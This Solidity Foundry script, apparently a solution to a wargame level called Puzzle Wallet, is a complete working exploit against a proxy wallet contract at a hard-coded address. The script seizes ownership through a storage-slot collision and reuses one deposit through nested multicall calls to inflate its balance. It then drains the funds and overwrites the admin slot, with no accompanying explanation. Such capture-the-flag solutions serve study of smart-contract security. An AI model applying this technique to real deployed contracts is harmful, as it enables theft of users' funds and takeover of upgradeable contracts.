// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface IPuzzleWallet {
  function pendingAdmin() external view returns (address);

  function proposeNewAdmin(address _newAdmin) external;

  function admin() external view returns (address);

  function owner() external view returns (address);

  function balances(address user) external view returns (uint256);

  function maxBalance() external view returns (uint256);

  function setMaxBalance(uint256 _maxBalance) external;

  function addToWhitelist(address addr) external;

  function deposit() external payable;

  function execute(
    address to,
    uint256 value,
    bytes calldata data
  ) external payable;

  function multicall(bytes[] calldata data) external payable;
}

contract Solve is Script, Test {
  address target = 0x887560258bb6262a8C64d9E7A8BF9EFc462F47A6;

  function run() public {
    vm.startBroadcast();

    IPuzzleWallet wallet = IPuzzleWallet(target);
    console.log("User balance is %s", wallet.balances(msg.sender));
    console.log("Wallet balance is %s", wallet.balances(address(wallet)));
    wallet.proposeNewAdmin(msg.sender);
    wallet.addToWhitelist(msg.sender);

    bytes memory depositSelector = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
    bytes[] memory multicallArgs = new bytes[](1);
    multicallArgs[0] = depositSelector;
    bytes memory multicallSelector = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, multicallArgs);

    bytes[] memory executeArgs = new bytes[](2);
    executeArgs[0] = multicallSelector;
    executeArgs[1] = multicallSelector;
    wallet.multicall{value: 0.001 ether}(executeArgs);

    console.log("My new balance is %s", wallet.balances(msg.sender));

    wallet.execute(address(0), wallet.balances(msg.sender), new bytes(0));
    uint256 payload = uint256(uint160(bytes20(msg.sender)));
    wallet.setMaxBalance(payload);

    require(wallet.admin() == msg.sender, "Failed to set admin");

    vm.stopBroadcast();
  }
}
